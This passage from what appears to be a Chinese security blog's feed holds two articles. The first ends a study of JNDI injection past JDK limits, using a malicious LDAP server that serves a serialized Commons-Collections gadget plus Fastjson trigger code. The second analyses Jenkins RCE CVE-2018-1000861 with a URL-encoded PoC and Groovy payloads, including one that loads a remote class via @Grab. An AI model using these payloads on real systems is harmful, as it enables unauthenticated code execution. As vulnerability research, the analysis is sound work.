</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">OperationInterceptor</span> <span class="params">( URL cb )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> </span>&#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = <span class="keyword">new</span> Entry(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException </span>&#123;</span><br><span class="line">            URL turl = <span class="keyword">new</span> URL(<span class="keyword">this</span>.codebase, <span class="keyword">this</span>.codebase.getRef().replace(<span class="string">'.'</span>, <span class="string">'/'</span>).concat(<span class="string">".class"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Send LDAP reference result for "</span> + base + <span class="string">" redirecting to "</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">"javaClassName"</span>, <span class="string">"Exploit"</span>);</span><br><span class="line">            String cbstring = <span class="keyword">this</span>.codebase.toString();</span><br><span class="line">            <span class="keyword">int</span> refPos = cbstring.indexOf(<span class="string">'#'</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload1: 利用LDAP+Reference Factory</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaCodeBase", cbstring);</span></span><br><span class="line"><span class="comment">//            e.addAttribute("objectClass", "javaNamingReference");</span></span><br><span class="line"><span class="comment">//            e.addAttribute("javaFactory", this.codebase.getRef());</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// Payload2: 返回序列化Gadget</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                e.addAttribute(<span class="string">"javaSerializedData"</span>, Base64.decode(<span class="string">"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> LDAPResult(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目标服务端代码，假设存在JNDI lookup()函数注入或Fastjson反序列化漏洞，此时通过JNDI注入实现反序列化漏洞利用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line"><span class="comment">//        new InitialContext().lookup("ldap://127.0.0.1:1234/EvilObject");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fastjson反序列化JNDI注入Gadget触发</span></span><br><span class="line">        String payload =<span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/EvilObject\",\"autoCommit\":\"true\" &#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行成功绕过触发：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/3.png" alt=""></p><h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>从lookup这个触发点来调试（前面Fastjson到最后利用的还是JNDI这个注入点）。</p><p>直接在com.sun.jndi.ldap.Obj类的decodeObject()函数上打上断点，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">decodeObject:235, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:1051, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:94, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">main:7, Test</span><br></pre></td></tr></table></figure><p>前面的函数调用链都是不同类lookup()函数之间的调用，com.sun.jndi.ldap.LdapCtx类的c_lookup()函数中会调用到com.sun.jndi.ldap.Obj类的decodeObject()函数进行解码对象的操作。</p><p>跟进去，先调用getCodebases()函数从JAVA_ATTRIBUTES中取出索引为4即javaCodeBase的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的var1(slot_2)变量；然后从JAVA_ATTRIBUTES中取出索引为1即javaSerializedData的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的var2 (slot_1)变量；这里var1(slot_2)变量为null，传入getURLClassLoader()函数调用后返回的是AppClassLoader即应用类加载器；再往下就是调用deserializeObject()函数来反序列化javaSerializedData的对象字节码：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/4.png" alt=""></p><p>其中静态变量JAVA_ATTRIBUTES的内容如下：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/5.png" alt=""></p><p>跟进函数中，就是熟悉的老朋友readObject()了，原生的Java反序列化漏洞就能触发了：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/6.png" alt=""></p><p>我们回到decodeObject()函数调用的getURLClassLoader()函数中，这是之前使用LDAP+Reference的方式被高版本JDK限制无法利用的地方。跟进去看看：</p><p><img src="/2020/09/07/浅析高低版JDK下的JNDI注入及绕过/7.png" alt=""></p><p>入参var1是javaCodeBase项设置的内容，由于未设置该项因此直接返回var2变量即AppClassLoader应用类加载器实例。这里看到，如果我们使用LDAP+Reference的方式进行利用的话，是需要设置javaCodeBase项的，此时var1就不为null、满足第一个判断条件，但是第二个条件<code>&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)</code>在高版本JDK中是默认不成立的，即trustURLCodebase值默认为false，因此之前的LDAP+Reference就不能利用了。</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></p><p><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="JNDI注入" scheme="https://www.mi1k7ea.com/tags/JNDI%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>（先知首发）从Jenkins RCE看Groovy代码注入</title>
    <link href="https://www.mi1k7ea.com/2020/09/05/%E4%BB%8EJenkins-RCE%E7%9C%8BGroovy%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.mi1k7ea.com/2020/09/05/从Jenkins-RCE看Groovy代码注入/</id>
    <published>2020-09-05T02:00:00.000Z</published>
    <updated>2020-09-05T01:57:47.169Z</updated>
    
    <content type="html"><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/8231" target="_blank" rel="noopener">https://xz.aliyun.com/t/8231</a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看了下Jenkins相关漏洞，实在是太膜拜Orange大佬的挖掘思路了！！！分析下之后发现不会Groovy，在学习借鉴Me7ell大佬分享的Groovy文章下，于是就整理出本篇文章。</p><h2 id="0x01-从Jenkins-RCE看起（CVE-2018-1000861）"><a href="#0x01-从Jenkins-RCE看起（CVE-2018-1000861）" class="headerlink" title="0x01 从Jenkins RCE看起（CVE-2018-1000861）"></a>0x01 从Jenkins RCE看起（CVE-2018-1000861）</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Jenkins是一个独立的开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。前身是Hudson是一个可扩展的持续集成引擎。可用于自动化各种任务，如构建，测试和部署软件。</p><p>Jenkins Pipeline是一套插件，支持将连续输送Pipeline实施和整合到Jenkins。Pipeline提供了一组可扩展的工具，用于通过PipelineDSL为代码创建简单到复杂的传送Pipeline。 </p><p>Jenkins远程代码执行漏洞（CVE-2018-1000861），简单地说，就是利用Jenkins动态路由机制的缺陷来绕过ACL的限制，结合绕过Groovy沙箱的Groovy代码注入来实现无验证RCE的攻击利用。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接用的Vulhub的环境：<a href="https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/</a></p><p>PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0d%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0d%0a%20%20%20%20%22%74%6f%75%63%68%20%2f%74%6d%70%2f%6d%69%31%6b%37%65%61%22%2e%65%78%65%63%75%74%65%28%29%0d%0a%20%20%7d%0d%0a%7d</span><br></pre></td></tr></table></figure><p>其中URL编码部分为：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">x</span> &#123;</span></span><br><span class="line">  <span class="keyword">public</span> x()&#123;</span><br><span class="line">    <span class="string">"touch /tmp/mi1k7ea"</span>.execute()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外，还有其他类型的PoC：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123; <span class="string">"touch /tmp/mi1k7ea"</span>.execute() &#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span>&#125;</span><br><span class="line">或</span><br><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;<span class="keyword">assert</span> Runtime.getRuntime().exec(<span class="string">"touch /tmp/mi1k7ea"</span>)&#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span>&#125;</span><br><span class="line">或</span><br><span class="line"><span class="meta">@GrabConfig</span>(disableChecksums=<span class="literal">true</span>)</span><br><span class="line"><span class="meta">@GrabResolver</span>(name=<span class="string">'Exp'</span>, root=<span class="string">'http://127.0.0.1:8000/'</span>)</span><br><span class="line"><span class="meta">@Grab</span>(group=<span class="string">'test'</span>, module=<span class="string">'poc'</span>, version=<span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">import</span> Exp;</span><br></pre></td></tr></table></figure><p>无需登录认证发起攻击：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/10.png" alt=""></p><p>成功RCE：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/11.png" alt=""></p><h3 id="漏洞原理简析"><a href="#漏洞原理简析" class="headerlink" title="漏洞原理简析"></a>漏洞原理简析</h3><p>网上很多文章包括Orange大佬的博客都讲解得很详细了，这里只是简单提下关键点。</p><h4 id="Jenkins动态路由机制"><a href="#Jenkins动态路由机制" class="headerlink" title="Jenkins动态路由机制"></a>Jenkins动态路由机制</h4><p>Jenkins是基于Stapler框架开发的，在web.xml中可以看到Jenkins是将所有的请求交给<code>org.kohsuke.stapler.Stapler</code>来进行处理的，而Stapler是使用一套Naming Convention来实现动态路由的。该动态路由机制是先以<code>/</code>作为分隔符将URL切分，然后以<code>jenkins.model.Jenkins</code>作为入口点开始往下遍历，如果URL切分部分满足以下条件则继续往下调用：</p><ol><li>Public属性的成员变量；</li><li>Public属性的方法，主要是getter方法，具体如下：</li></ol><ul><li><code>get&lt;token&gt;()</code></li><li><code>get&lt;token&gt;(String)</code></li><li><code>get&lt;token&gt;(Int)</code></li><li><code>get&lt;token&gt;(Long)</code></li><li><code>get&lt;token&gt;(StaplerRequest)</code></li><li><code>getDynamic(String, …)</code></li><li><code>doDynamic(…)</code></li><li><code>do&lt;token&gt;(…)</code></li><li><code>js&lt;token&gt;(…)</code></li><li><code>Class method with @WebMethod annotation</code></li><li><code>Class method with @JavaScriptMethod annotation</code></li></ul><p>简单地说，<strong>Jenkins动态路由机制在解析URL的时候会调用相关类的getter方法</strong>。</p><h4 id="Jenkins白名单路由"><a href="#Jenkins白名单路由" class="headerlink" title="Jenkins白名单路由"></a>Jenkins白名单路由</h4><p>Jenkins动态路由主要调用的是<code>org.kohsuke.stapler.Stapler#tryInvoke()</code>方法，该方法会对除了boundObjectTable外所有node都会进行一次权限检查，具体实现在<code>jenkins.model.Jenkins#getTarget()</code>中，这其中实际就是一个URL前缀白名单检查：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ImmutableSet&lt;String&gt; ALWAYS_READABLE_PATHS = ImmutableSet.of(</span><br><span class="line">    <span class="string">"/login"</span>,</span><br><span class="line">    <span class="string">"/logout"</span>,</span><br><span class="line">    <span class="string">"/accessDenied"</span>,</span><br><span class="line">    <span class="string">"/adjuncts/"</span>,</span><br><span class="line">    <span class="string">"/error"</span>,</span><br><span class="line">    <span class="string">"/oops"</span>,</span><br><span class="line">    <span class="string">"/signup"</span>,</span><br><span class="line">    <span class="string">"/tcpSlaveAgentListener"</span>,</span><br><span class="line">    <span class="string">"/federatedLoginService/"</span>,</span><br><span class="line">    <span class="string">"/securityRealm"</span>,</span><br><span class="line">    <span class="string">"/instance-identity"</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>因此，绕过ACL的关键在于，要在上述白名单的一个入口点中找到其他对象的Reference（引用），来跳到非白名单成员从而实现绕过白名单URL前缀的限制。</p><h4 id="通过对象间的Reference绕过ACL"><a href="#通过对象间的Reference绕过ACL" class="headerlink" title="通过对象间的Reference绕过ACL"></a>通过对象间的Reference绕过ACL</h4><p>如上所述，关键在于找到一个Reference作为跳板来绕过，Orange给出了如下跳板：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/securityRealm/user/[username]/descriptorByName/[descriptor_name]/</span><br></pre></td></tr></table></figure><p>该跳板在动态路由中会依次执行如下方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jenkins.model.Jenkins.getSecurityRealm()</span><br><span class="line">.getUser([username])</span><br><span class="line">.getDescriptorByName([descriptor_name])</span><br></pre></td></tr></table></figure><p>这是因为在Jenkins中，每个对象都是继承于<code>hudson.model.Descriptor</code>类，而继承该类的对象可以通过调用<code>hudson.model.DescriptorByNameOwner#getDescriptorByName(String)</code>方法来进行调用。</p><h4 id="RCE-Gadget"><a href="#RCE-Gadget" class="headerlink" title="RCE Gadget"></a>RCE Gadget</h4><p>Orange给出了好几条可结合利用的漏洞利用链，其中之最当然是RCE的Gadget。</p><p>前面简介中提到了Jenkins Pipeline，它其实就是基于Groovy实现的一个DSL，可使开发者十分方便地去编写一些Build Script来完成自动化的编译、测试和发布。</p><p>在Jenkins中，大致使用如下代码来检测Groovy的语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> JSON <span class="title">doCheckScriptCompile</span><span class="params">(@QueryParameter String value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        CpsGroovyShell trusted = <span class="keyword">new</span> CpsGroovyShellFactory(<span class="keyword">null</span>).forTrusted().build();</span><br><span class="line">        <span class="keyword">new</span> CpsGroovyShellFactory(<span class="keyword">null</span>).withParent(trusted).build().getClassLoader().parseClass(value);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (CompilationFailedException x) &#123;</span><br><span class="line">        <span class="keyword">return</span> JSONArray.fromObject(CpsFlowDefinitionValidator.toCheckStatus(x).toArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CpsFlowDefinitionValidator.CheckStatus.SUCCESS.asJSON();</span><br><span class="line">    <span class="comment">// Approval requirements are managed by regular stapler form validation (via doCheckScript)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键就是<code>GroovyClassLoader.parseClass()</code>，该方法只是进行AST解析但并未执行Groovy语句，即实际并没有execute()方法调用，而且真正执行Groovy代码时会遇到Groovy沙箱的限制。</p><p>如何解决这个问题来绕过Groovy沙箱呢？Orange给出了答案——借助编译时期的Meta Programming，其中提到了两种方法。</p><h5 id="利用-ASTTest执行断言"><a href="#利用-ASTTest执行断言" class="headerlink" title="利用@ASTTest执行断言"></a>利用@ASTTest执行断言</h5><p>根据Groovy的<a href="http://groovy-lang.org/metaprogramming.html" target="_blank" rel="noopener">Meta Programming手册</a>，发现可利用<a href="mailto:`@groovy.transform.ASTTest" target="_blank" rel="noopener">`@groovy.transform.ASTTest</a>`注解来实现在AST上执行一个断言。例如：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123; <span class="keyword">assert</span> Runtime.getRuntime().exec(<span class="string">"calc"</span>) &#125;)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>&#123;</span>&#125;</span><br></pre></td></tr></table></figure><p>但在远程利用上会报错，原因在于Pipeline Shared Groovy Libraries Plugin这个插件，主要用于在PipeLine中引入自定义的函式库。Jenkins会在所有PipeLine执行前引入这个插件，而在编译阶段的ClassPath中并没有对应的函式库从而导致报错。</p><p>直接删掉这个插件是可以成功利用的，但由于该插件是随PipeLine默认安装的、因此这不是最优解。</p><h5 id="利用-Grab远程加载恶意类"><a href="#利用-Grab远程加载恶意类" class="headerlink" title="利用@Grab远程加载恶意类"></a>利用@Grab远程加载恶意类</h5><p>@Grab注解的详细用法在<a href="http://docs.groovy-lang.org/latest/html/documentation/grape.html" target="_blank" rel="noopener">Dependency management with Grape</a>中有讲到，简单地说，Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库。例如：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GrabResolver</span>(name=<span class="string">'restlet'</span>, root=<span class="string">'http://maven.restlet.org/'</span>)</span><br><span class="line"><span class="meta">@Grab</span>(group=<span class="string">'org.restlet'</span>, module=<span class="string">'org.restlet'</span>, version=<span class="string">'1.1.6'</span>)</span><br><span class="line"><span class="keyword">import</span> org.restlet</span><br></pre></td></tr></table></figure><h2 id="0x02-Groovy入门"><a href="#0x02-Groovy入门" class="headerlink" title="0x02 Groovy入门"></a>0x02 Groovy入门</h2><h3 id="Groovy简介"><a href="#Groovy简介" class="headerlink" title="Groovy简介"></a>Groovy简介</h3><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy代码能够与Java代码很好地结合，也能用于扩展现有代码。由于其运行在JVM上的特性，Groovy也可以使用其他非Java语言编写的库。</p><p>Groovy是用于Java虚拟机的一种敏捷的动态语言，它是一种成熟的面向对象编程语言，既可以用于面向对象编程，又可以用作纯粹的脚本语言。使用该种语言不必编写过多的代码，同时又具有闭包和动态语言中的其他特性。</p><p>Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程），使用方式基本与使用Java代码的方式相同，该语言特别适合与Spring的动态语言支持一起使用，设计时充分考虑了Java集成，这使Groovy与Java代码的互操作很容易。（注意：不是指Groovy替代Java，而是指Groovy和Java很好的结合编程。）</p><p>Groovy有以下特点：</p><ul><li>同时支持静态和动态类型；</li><li>支持运算符重载；</li><li>本地语法列表和关联数组；</li><li>对正则表达式的本地支持；</li><li>各种标记语言，如XML和HTML原生支持；</li><li>Groovy对于Java开发人员来说很简单，因为Java和Groovy的语法非常相似；</li><li>可以使用现有的Java库；</li><li>Groovy扩展了java.lang.Object；</li></ul><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>参考：<a href="https://www.w3cschool.cn/groovy/" target="_blank" rel="noopener">https://www.w3cschool.cn/groovy/</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载Groovy：<a href="http://groovy-lang.org/download.html" target="_blank" rel="noopener">http://groovy-lang.org/download.html</a></p><p>解压之后，使用IDEA新建Groovy项目时选择解压的Groovy目录即可。然后点击src-&gt;new&gt;groovy class，即可新建一个groovy文件，内容如下：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> &#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> main(args)&#123;</span><br><span class="line">        println <span class="string">"Hello World!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5种运行方式"><a href="#5种运行方式" class="headerlink" title="5种运行方式"></a>5种运行方式</h3><h4 id="groovyConsole图形交互控制台"><a href="#groovyConsole图形交互控制台" class="headerlink" title="groovyConsole图形交互控制台"></a>groovyConsole图形交互控制台</h4><p>在终端下输入<code>groovyConsole</code>启动图形交互控制台，在上面可以直接编写代码执行：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/1.png" alt=""></p><h4 id="groovysh-shell命令交互"><a href="#groovysh-shell命令交互" class="headerlink" title="groovysh shell命令交互"></a>groovysh shell命令交互</h4><p>在终端下输入<code>groovysh</code>启动一个shell命令行来执行Groovy代码的交互：</p><p><img src="/2020/09/05/从Jenkins-RCE看Groovy代码注入/2.png" alt=""></p><h4 id="用命令行执行Groovy脚本"><a href="#用命令行执行Groovy脚本" class="headerlink" title="用命令行执行Groovy脚本"></a>用命令行执行Groovy脚本</h4><p>在GROOVY_HOME\bin里有个叫“groovy”或“groovy.bat”的脚本文件，可以类似<code>python test.py</code>这种方式来执行Groovy脚本。</p><p>1.groovy：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span 